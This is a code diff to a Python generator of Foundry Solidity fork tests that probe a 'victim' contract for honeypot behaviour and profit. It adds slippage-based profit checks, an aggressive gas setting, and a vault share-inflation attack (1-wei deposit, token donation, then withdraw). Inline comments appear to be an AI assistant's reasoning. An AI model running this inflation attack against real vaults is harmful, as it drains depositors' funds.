@@ -142,6 +142,8 @@ contract HoneypotTestToken is Test {
         }
 
         // 3. Approve & Deposit
+        <ROUNDING_LOGIC>
+
         IERC20(token).approve(victim, tokenAmount);
         
         bool success;
@@ -185,6 +187,25 @@ contract HoneypotTestToken is Test {
         if (token != weth) {
              IERC20(token).approve(router, tokenBal);
              // Swap back
+             // Use 0.1% slippage calculation for stricter profit checking
+             uint256 minOut = (tokenBal * 999) / 1000; // rough estimation if prices 1:1, but exactInputSingle needs amountOutMinimum in terms of tokenOut (ETH).
+             // Since we don't know the price in simulation easily without oracle, we used 0.
+             // But user requested "Simulate slippage in 0.1%".
+             // If we set amountOutMinimum > 0, the swap will fail if not met.
+             // If there is a price bug, we might get MORE than expected.
+             // Let's try to set a high amountOutMinimum? No, that would revert.
+             // Maybe the user means: Use a specific fee tier or path that implies 0.1%?
+             // Or simply: Calculate amountOutMinimum based on PREVIOUS swap rate?
+             // We swapped startEth -> tokenAmount. Rate = tokenAmount / startEth.
+             // Expected return = tokenBal * (startEth / tokenAmount).
+             // Slippage 0.1% = Expected * 0.999.
+             
+             uint256 expectedEth = 0;
+             if (tokenAmount > 0) {
+                 expectedEth = (tokenBal * startEth) / tokenAmount;
+             }
+             uint256 minOutEth = (expectedEth * 999) / 1000;
+
              try IRouter(router).exactInputSingle(IRouter.ExactInputSingleParams({
                 tokenIn: token,
                 tokenOut: weth,
@@ -192,7 +213,7 @@ contract HoneypotTestToken is Test {
                 recipient: attacker,
                 deadline: block.timestamp,
                 amountIn: tokenBal,
-                amountOutMinimum: 0,
+                amountOutMinimum: minOutEth,
                 sqrtPriceLimitX96: 0
             })) returns (uint256 amountOut) {
                 // Unwrap WETH
@@ -412,8 +433,8 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         vm.deal(attacker, 1 ether);
         uint256 sfBalBefore = attacker.balance;
         
-        // 1. High Gas Price Simulation (200 gwei)
-        vm.txGasPrice(200000000000); 
+        // 1. High Gas Price Simulation (250 gwei) - Aggressive Mode
+        vm.txGasPrice(250000000000); 
         
         bool sfSuccess;
         // Attempt standard execute
@@ -447,6 +468,37 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         return;
     """
 
+def _get_rounding_inflation_logic(bug_type: Optional[str]) -> str:
+    if bug_type != "vault_rounding_dust":
+        return ""
+
+    return """
+        // Rounding/Inflation Attack Simulation
+        // 1. Deposit 1 wei to get 1 share (or tiny amount)
+        uint256 tinyAmount = 1;
+        IERC20(token).approve(victim, tinyAmount);
+        (bool r1, ) = victim.call(abi.encodeWithSignature("deposit(uint256)", tinyAmount));
+        if (!r1) (r1, ) = victim.call(abi.encodeWithSignature("mint(uint256)", tinyAmount));
+        
+        if (r1) {
+            // 2. Donate massive amount to inflate share price
+            uint256 donation = 0.0001 ether; 
+            if (tokenAmount > donation) {
+                IERC20(token).transfer(victim, donation);
+                console.log("[SIM] Inflation: Donated tokens to vault:", donation);
+                
+                (bool r2, bytes memory data) = victim.call(abi.encodeWithSignature("withdraw(uint256)", tinyAmount));
+                if (!r2) (r2, data) = victim.call(abi.encodeWithSignature("redeem(uint256)", tinyAmount));
+                
+                if (r2) {
+                    uint256 balCheck = IERC20(token).balanceOf(attacker);
+                    console.log("[SIM] Inflation: Withdrew after donation. Balance:", balCheck);
+                }
+            }
+        }
+    """
+
+
 def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, self_destruct_selectors: List[str] = None, bug_type: Optional[str] = None) -> str:
     content = HONEYPOT_TEST_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
     content = content.replace("<TOKEN_ADDRESS>", token_address)
@@ -459,6 +511,9 @@ def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_ur
 
     sf_logic = _get_sequencer_fee_logic(bug_type)
     content = content.replace("<SEQUENCER_FEE_LOGIC>", sf_logic)
+
+    ri_logic = _get_rounding_inflation_logic(bug_type)
+    content = content.replace("<ROUNDING_LOGIC>", ri_logic)
     
     return content
 
